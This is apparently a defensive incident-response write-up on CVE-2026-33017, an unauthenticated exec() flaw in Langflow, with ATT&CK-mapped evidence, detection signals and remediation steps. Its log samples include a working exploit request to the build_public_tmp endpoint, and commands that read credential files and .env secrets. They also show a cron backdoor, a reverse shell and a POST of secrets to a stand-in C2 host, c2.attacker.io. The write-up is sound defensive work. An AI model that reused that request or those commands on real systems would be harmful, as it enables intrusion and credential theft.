Background

What Happened

CVE-2026-33017 is a critical unauthenticated remote code execution vulnerability in Langflow, the open-source visual platform for building AI-powered agents and workflows. The root cause is Python's exec() function being called with attacker-controlled flow node data submitted to POST /api/v1/build_public_tmp/{flow_id}/flow — an endpoint that requires no authentication whatsoever.

The Sysdig Threat Research Team observed the first exploitation attempts within 20 hours of the advisory publication on 2026-03-17, with attackers deriving working exploits directly from the advisory text itself. CISA added CVE-2026-33017 to the Known Exploited Vulnerabilities catalog on 2026-03-25. JFrog subsequently discovered that version 1.8.2, widely reported as the remediation patch, remains vulnerable — only version 1.9.0+ fully remediates the vulnerability.

Patch immediately: Upgrade to Langflow 1.9.0+. Version 1.8.2 is NOT a complete fix. Unauthenticated — any network access to the Langflow port is sufficient for full RCE.

MITRE ATT&CK Timeline — DFIR Evidence

Initial Access
T1190 — Exploit Public-Facing Application
T1190
Unauthenticated POST request to /api/v1/build_public_tmp/{flow_id}/flow returning HTTP 200 with exec() stdout confirms exploitation. No brute-force, no token bypass — the endpoint is openly accessible by design of the vulnerable version.
Forensic Evidence HTTP access log / WAF
POST /api/v1/build_public_tmp/aaaa1111/flow HTTP/1.1 Host: langflow.victim.ai:7860 Content-Type: application/json Content-Length: 287 {"nodes":[{"data":{"node":{"template":{"code":{"value":"import os; os.system('id')"}}}}}]} HTTP/1.1 200 OK {"result": "uid=0(root) gid=0(root) groups=0(root)"}
Detection signal: The endpoint returning 200 with exec() output is self-confirming exploitation. Any HTTP 200 from build_public_tmp with code output in body is high-fidelity.
Execution
T1059.006 — Python
T1059.006
Python subprocess spawning bash; socket.connect() to external IP from Langflow process. The exec() call inherits the full Python globals — no import restrictions, no restricted builtins. Attacker code runs in the same memory space as the Langflow application.
Forensic Evidence EDR process tree / auditd
PROCESS TREE: uvicorn (pid 1234) → python3 (pid 1235) └─ bash -i (pid 2100) ← ANOMALY └─ sh -c "cat /app/.env" (pid 2101) NETWORK: python3 [pid 1235] → 185.220.x.x:4444 [ESTABLISHED] Socket type: SOCK_STREAM (TCP reverse shell)
Detection signal: Parent process 'langflow' or 'uvicorn' spawning bash is high-fidelity — never legitimate in production AI deployments.
Discovery + Credential Access
T1083 — File & Directory Discovery / T1552.001 — Credentials in Files
T1083T1552.001
cat /app/.env, env | base64, find / -name '*.pem' executed by Langflow process. AI/ML services hold disproportionate credential value — OpenAI and Anthropic API keys grant direct access to expensive compute resources that can be monetized immediately.
Forensic Evidence auditd / bash_history
AUDIT LOG (syscall=openat): pid=2101 ppid=2100 comm="cat" exe="/usr/bin/cat" name="/app/.env" success=yes auid=0 COMMANDS EXECUTED (from bash pid 2100): cat /app/.env env | base64 find / -name "*.key" -o -name "*.pem" 2>/dev/null cat ~/.config/langflow/langflow.db
Detection signal: AI/ML services hold disproportionate credential value — .env files are primary target. Cat of .env by web process is always anomalous.
Persistence
T1053.003 — Cron
T1053.003
crontab -l showing new entry pointing to /tmp/.lf/backdoor.py; /tmp/.lf/ directory creation via mktemp. The cron mechanism survives application restarts and, if the container mounts host filesystem, persists across container replacement.
Forensic Evidence crontab / filesystem audit
$ crontab -l */5 * * * * python3 /tmp/.lf/backdoor.py 2>/dev/null $ ls -la /tmp/.lf/ total 12 drwx------ 2 root root 60 Mar 17 14:33 . drwxrwxrwt 8 root root 180 Mar 17 14:33 .. -rwxr-xr-x 1 root root 412 Mar 17 14:33 backdoor.py
Detection signal: Crontab modification by web application process is anomalous in all contexts. /tmp/ hidden directory creation from web service process is high-confidence indicator.
Exfiltration
T1041 — Exfiltration Over C2 Channel
T1041
curl POST to external domain with base64-encoded .env content; DNS queries to attacker-controlled domain from Langflow host. The exfil uses HTTPS to blend with legitimate AI service outbound traffic — Langflow hosts routinely make HTTPS calls to OpenAI, Anthropic, and HuggingFace.
Forensic Evidence network capture / proxy log
PROXY LOG: 2026-03-17T14:34:02Z POST https://c2.attacker.io/collect Content-Length: 4892 X-Forwarded-For: 10.0.1.5 (langflow-prod) Body (base64-decoded): host=langflow-prod&env=OPENAI_API_KEY=sk-proj-... DNS QUERIES from langflow-prod: 14:33:58 c2.attacker.io → 185.220.x.x 14:34:01 c2.attacker.io → 185.220.x.x [exfil POST] 14:39:03 c2.attacker.io → 185.220.x.x [cron beacon]
Detection signal: Large base64-encoded POST body to non-AI-service domain from AI host is high-confidence exfil signal. Baseline expected destinations: openai.com, anthropic.com, api.huggingface.co.

Incident Response

Response Actions

🔄
Upgrade to 1.9.0+
Version 1.8.2 is NOT a complete fix — JFrog confirmed it remains vulnerable. Only 1.9.0+ fully removes the exec() call from the unauthenticated endpoint. Verify with: pip show langflow | grep Version
🔒
Block Port 7860
Remove Langflow from internet exposure immediately. Default port 7860 should be firewalled or bound to localhost only. Use a reverse proxy with authentication in front of any Langflow instance that must be network-accessible.
🔍
Hunt Process Ancestry
Search EDR for uvicorn or langflow processes spawning bash, sh, curl, or wget. Any such process tree is anomalous. Look back 30+ days if your Langflow version was ≤ 1.8.x.
🔑
Rotate API Keys
Any Langflow instance running a vulnerable version should be treated as having exfiltrated its .env contents. Immediately rotate: OpenAI, Anthropic, AWS, HuggingFace, and any other credentials present in the environment.
📁
Inspect .env Files
Audit what credentials were stored in .env, ~/.langflow/config, and process environment variables. Assume all of these were read and exfiltrated if your instance was internet-exposed and running a vulnerable version.
🗓
Review Crontabs
Check all crontabs (root and service user) for unauthorized entries. Inspect /tmp/ for hidden directories. Check for new files in ~/.config/ that may be backdoor scripts or persistence mechanisms.
